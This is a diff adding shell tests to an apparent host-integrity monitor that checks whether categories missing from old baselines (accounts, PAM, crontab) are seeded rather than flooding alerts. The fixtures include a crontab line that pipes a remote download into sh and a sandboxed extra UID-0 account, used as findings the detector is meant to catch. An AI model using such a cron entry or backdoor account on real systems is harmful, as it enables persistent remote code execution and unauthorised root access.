@@ -198,3 +198,103 @@ setup() {
   [[ "$output" != *"SOFT|persistence"* ]]   # log() goes to stderr, findings to stdout
   [ ! -f "$BASELINE_DIR/units" ]
 }
+
+# --- categories added after the baseline was taken ------------------------
+#
+# v2.1.0 added accounts/sudoers/sshd_config/pam/setuid to the snapshot. On a
+# host whose baseline predated them it created an empty reference for each and
+# reported every line as new on every pass -- tens of thousands of events a day.
+
+_sandbox_auth_files() {
+  PASSWD_FILE="$TEST_TMP/passwd"
+  printf 'root:x:0:0:root:/root:/bin/bash\n' > "$PASSWD_FILE"
+  PAM_DIR="$TEST_TMP/pam.d"
+  mkdir -p "$PAM_DIR"
+  printf 'auth required pam_unix.so\n' > "$PAM_DIR/sshd"
+}
+
+@test "baseline_build records which categories it captured" {
+  baseline_build
+  run cat "$BASELINE_DIR/.categories"
+  [[ "$output" == *"accounts"* ]]
+  [[ "$output" == *"pam"* ]]
+  [[ "$output" == *"crontab"* ]]
+}
+
+@test "a category the baseline never captured is recorded once, not reported line by line" {
+  _sandbox_auth_files
+  baseline_build
+  rm -f "$BASELINE_DIR/.categories" "$BASELINE_DIR/pam"   # a v2.0 baseline
+
+  run baseline_diff
+  [[ "$output" != *"new in pam"* ]]
+  [ -s "$BASELINE_DIR/pam" ]
+  run jq -er 'select(.category == "baseline_seeded") | .detail' "$EVENTS_LOG"
+  [[ "$output" == *"pam"* ]]
+
+  run baseline_diff
+  [ -z "$output" ]
+}
+
+@test "an empty reference left behind by v2.1.0 is recorded, not reported" {
+  _sandbox_auth_files
+  baseline_build
+  rm -f "$BASELINE_DIR/.categories"
+  : > "$BASELINE_DIR/accounts"; : > "$BASELINE_DIR/pam"
+
+  run baseline_diff
+  [[ "$output" != *"new in accounts"* ]]
+  [[ "$output" != *"new in pam"* ]]
+  [ -f "$BASELINE_DIR/.categories" ]
+
+  # and from here on it is a real reference
+  printf 'backup2:x:0:0:backup:/root:/bin/bash\n' >> "$PASSWD_FILE"
+  run baseline_diff
+  [[ "$output" == *"new in accounts: backup2:0:0"* ]]
+}
+
+@test "an empty crontab in an old baseline is never taken as unrecorded" {
+  # empty is the normal state there, and a first entry is exactly the finding
+  baseline_build
+  rm -f "$BASELINE_DIR/.categories"
+  fixture crontab_out "*/5 * * * * curl -s http://198.51.100.9/x | sh"
+
+  run baseline_diff
+  [[ "$output" == *"new in crontab:"* ]]
+}
+
+@test "with a manifest, a category recorded empty is diffed, not recorded again" {
+  PASSWD_FILE="$TEST_TMP/passwd"
+  : > "$PASSWD_FILE"
+  baseline_build
+  printf 'backup2:x:0:0:backup:/root:/bin/bash\n' > "$PASSWD_FILE"
+
+  run baseline_diff
+  [[ "$output" == *"new in accounts: backup2:0:0"* ]]
+}
+
+@test "a category missing from the manifest is recorded once" {
+  _sandbox_auth_files
+  baseline_build
+  grep -vx pam "$BASELINE_DIR/.categories" > "$TEST_TMP/m"
+  mv "$TEST_TMP/m" "$BASELINE_DIR/.categories"
+  printf 'auth optional pam_extra.so\n' > "$PAM_DIR/extra"
+
+  run baseline_diff
+  [[ "$output" != *"new in pam"* ]]
+  run grep -cx pam "$BASELINE_DIR/.categories"
+  [ "$output" = "1" ]
+}
+
+@test "dry run: an unrecorded category is neither recorded nor reported" {
+  _sandbox_auth_files
+  baseline_build
+  rm -f "$BASELINE_DIR/.categories" "$BASELINE_DIR/pam"
+  DRY_RUN=1
+
+  run baseline_diff
+  [[ "$output" != *"new in pam"* ]]
+  [ ! -f "$BASELINE_DIR/pam" ]
+  [ ! -f "$BASELINE_DIR/.categories" ]
+  [ ! -s "$EVENTS_LOG" ]
+}
